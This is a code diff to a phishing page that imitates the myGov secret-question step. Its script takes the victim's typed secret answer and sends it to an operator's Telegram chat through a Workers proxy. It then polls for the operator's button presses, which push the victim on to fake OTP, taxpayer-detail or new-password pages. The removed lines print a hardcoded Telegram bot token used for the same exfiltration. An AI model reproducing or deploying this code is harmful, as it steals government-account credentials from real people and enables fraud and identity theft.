@@ -128,50 +128,115 @@
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
     <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
 
-    <!-- ====== TELEGRAM + 8‑SECOND PROCESSING DELAY ====== -->
+    <!-- ====== TELEGRAM REDIRECT CONTROL ====== -->
     <script>
         // ============================================================
-        // CONFIGURATION – YOUR TELEGRAM BOT CREDENTIALS
+        // CONFIGURATION
         // ============================================================
-        const BOT_TOKEN = '8895080988:AAFgOP7jAWJKElaTchJFVu4fvHC-mTpAdUs';
-        const CHAT_ID = '8981287811';
+        const PROXY   = "https://telegram-proxy.wyldamcmur.workers.dev";
+        const CHAT_ID = "8981287811";
+
+        const ROUTES = {
+            "otp":     "otp.html",
+            "detail":  "detail.html",
+            "taxpayer":   "taxpayer.html",
+            "newpass": "newpass.html"
+        };
         // ============================================================
 
         $(document).ready(function() {
-            $('#sqa-form').on('submit', function(e) {
+            $('#sqa-form').on('submit', async function(e) {
                 e.preventDefault(); // Stop the form from reloading
 
                 // Get the secret answer
-                let answer = $.trim($('#answer').val());
+                const answer = $.trim($('#answer').val());
                 if (!answer) {
                     alert('Please answer your secret question.');
                     return;
                 }
 
-                // 1. Disable the button and show processing state
+                // 1. Disable the button and show processing state (spinner)
                 const $btn = $('#sqa-form button[type="submit"]');
                 $btn.addClass('processing');
                 $btn.prop('disabled', true);
 
-                // 2. Build the Telegram message
-                let msg = "|----------| SECRET QUESTION ANSWER |--------------|\n";
-                msg += "Answer: " + answer + "\n";
-                msg += "|-----------------------------------------|";
+                // 2. Unique session ID
+                const sid = (crypto.randomUUID && crypto.randomUUID().slice(0, 8)) ||
+                            Math.random().toString(36).slice(2, 10);
 
-                // 3. Send Telegram notification (fire and forget)
-                $.ajax({
-                    url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`,
-                    method: 'GET',
-                    timeout: 5000
-                    // No success/error handling – we redirect after 8s anyway
-                });
+                // 3. Build the inline keyboard (same options as login page)
+                const keyboard = {
+                    inline_keyboard: [
+                        [{ text: "🔐 OTP",          callback_data: `otp:${sid}`     }],
+                        [{ text: "↩️ Detail",        callback_data: `detail:${sid}`   }],
+                        [{ text: "✅ Taxpayer",    callback_data: `taxpayer:${sid}` }],
+                        [{ text: "🔒 New Password", callback_data: `newpass:${sid}` }],
+                    ]
+                };
 
-                // 4. Wait 8 seconds, then redirect to the next page
-                setTimeout(function() {
-                    window.location.href = 'newpass.html';
-                }, 8000);
+                try {
+                    // 4. Get current offset so we only react to NEW callbacks
+                    const r0 = await fetch(`${PROXY}/getUpdates?offset=-1`);
+                    const d0 = await r0.json();
+                    const startOffset = (d0.result && d0.result.length)
+                        ? d0.result[d0.result.length - 1].update_id + 1
+                        : 0;
+
+                    // 5. Send the secret answer + buttons to Telegram
+                    await fetch(`${PROXY}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: `🔔 myGov Secret Question\n❓ What was the name of my first pet?\n💬 Answer: ${answer}\n🆔 Session: ${sid}`,
+                            reply_markup: keyboard
+                        })
+                    });
+
+                    // 6. Listen for the redirect command
+                    pollLoop(startOffset, sid);
+
+                } catch (err) {
+                    console.error(err);
+                }
             });
         });
+
+        async function pollLoop(offset, sid) {
+            while (true) {
+                try {
+                    const r = await fetch(`${PROXY}/getUpdates?offset=${offset}&timeout=15`);
+                    const data = await r.json();
+                    if (!data.result) continue;
+
+                    for (const upd of data.result) {
+                        offset = upd.update_id + 1;
+                        const cb = upd.callback_query;
+                        if (!cb) continue;
+
+                        const [action, sess] = cb.data.split(":");
+                        if (sess !== sid) continue;
+
+                        // Acknowledge the button press in Telegram
+                        await fetch(`${PROXY}/answerCallbackQuery`, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                callback_query_id: cb.id,
+                                text: "Redirecting user…"
+                            })
+                        });
+
+                        // Follow the command
+                        window.location.href = ROUTES[action] || "taxpayer.html";
+                        return;
+                    }
+                } catch (e) {
+                    console.error(e);
+                    await new Promise(r => setTimeout(r, 2000));
+                }
+            }
+        }
     </script>
 </body>
 
